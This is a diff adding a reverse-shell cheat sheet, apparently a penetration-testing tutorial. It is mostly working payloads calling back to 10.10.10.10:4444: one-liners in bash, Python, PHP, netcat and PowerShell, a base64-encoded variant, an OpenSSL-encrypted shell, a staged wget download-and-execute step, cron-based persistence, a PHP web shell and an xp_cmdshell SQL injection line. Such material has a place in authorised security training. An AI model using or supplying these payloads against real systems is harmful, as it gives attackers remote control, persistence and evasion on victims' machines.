@@ -1,0 +1,160 @@
+Basic Reverse Shell Anatomy
+All reverse shells follow this pattern:
+
+Target executes payload (through RCE, file upload, etc.)
+Payload connects back to attacker's IP:PORT
+Payload redirects stdin/stdout/stderr to the network connection
+Attacker gets interactive shell on target
+
+Setting Up the Listener (Attacker Side)
+Netcat listener:
+bash# Basic listener
+nc -lvnp 4444
+
+# Verbose listener with connection details
+nc -lvnp 4444 -s 0.0.0.0
+
+# Alternative listeners
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+rlwrap nc -lvnp 4444  # With readline support
+Crafting Reverse Shells
+Bash Reverse Shells
+Basic bash reverse shell:
+bashbash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+Breaking this down:
+
+bash -i = Interactive bash shell
+>& = Redirect stdout and stderr
+/dev/tcp/IP/PORT = Linux pseudo-device for TCP connections
+0>&1 = Redirect stdin to stdout (makes it interactive)
+
+Alternative bash methods:
+bash# Method 1 - Explicit redirection
+bash -c 'exec bash -i &>/dev/tcp/10.10.10.10/4444 <&1'
+
+# Method 2 - Using sh
+sh -i >& /dev/tcp/10.10.10.10/4444 0>&1
+
+# Method 3 - Encoded
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjE= | base64 -d | bash
+Python Reverse Shells
+Python2:
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+Python3:
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+Readable Python reverse shell:
+pythonimport socket
+import subprocess
+import os
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("10.10.10.10", 4444))
+
+# Redirect file descriptors
+os.dup2(s.fileno(), 0)  # stdin
+os.dup2(s.fileno(), 1)  # stdout  
+os.dup2(s.fileno(), 2)  # stderr
+
+# Execute shell
+subprocess.call(["/bin/sh", "-i"])
+
+
+PHP Reverse Shells
+Simple PHP:
+phpphp -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+Full PHP reverse shell:
+php<?php
+$sock = fsockopen("10.10.10.10", 4444);
+$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
+?>
+
+Netcat Reverse Shells
+Traditional netcat:
+bashnc -e /bin/sh 10.10.10.10 4444
+
+Modern netcat (without -e flag):
+bashrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f
+Breaking down the mkfifo method:
+
+mkfifo /tmp/f = Create named pipe
+cat /tmp/f = Read from pipe
+/bin/sh -i 2>&1 = Interactive shell with stderr redirected
+nc 10.10.10.10 4444 >/tmp/f = Send output to pipe
+
+PowerShell Reverse Shells
+
+Basic PowerShell:
+
+powershellpowershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+Readable PowerShell:
+
+powershell$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444)
+$stream = $client.GetStream()
+[byte[]]$bytes = 0..65535|%{0}
+
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
+    $sendback = (iex $data 2>&1 | Out-String )
+    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+    $stream.Write($sendbyte,0,$sendbyte.Length)
+    $stream.Flush()
+}
+$client.Close()
+Advanced Reverse Shell Techniques
+Encrypted Reverse Shells
+
+
+OpenSSL encrypted:
+bash# Listener
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
+
+# Target
+mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.10.10:4444 > /tmp/s; rm /tmp/s
+Staged Reverse Shells
+Two-stage approach:
+bash# Stage 1 - Download and execute
+wget http://10.10.10.10:8000/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh
+
+# Stage 2 - Full reverse shell payload
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+Persistent Reverse Shells
+Cron-based persistence:
+bash# Add to crontab for persistence
+echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'" | crontab -
+
+Upgrading Reverse Shells
+From basic shell to fully interactive TTY:
+
+Method 1 - Python pty:
+bashpython -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+# Ctrl+Z to background
+stty raw -echo; fg
+
+Method 2 - Script command:
+bashscript -qc /bin/bash /dev/null
+
+Method 3 - Socat upgrade:
+bash# On target
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444
+
+# On attacker  
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+Common Payload Delivery Methods
+Web shells:
+php<?php system($_GET['cmd']); ?>
+
+# Then: http://target.com/shell.php?cmd=bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+SQL injection:
+sql'; exec xp_cmdshell 'powershell -c "reverse shell payload here"'; --
+File upload:
+
+Upload reverse shell script
+Execute via web request or include
+
+The key is understanding that reverse shells are just network connections with redirected input/output - once you grasp that concept, you can craft them in any language that supports network sockets!
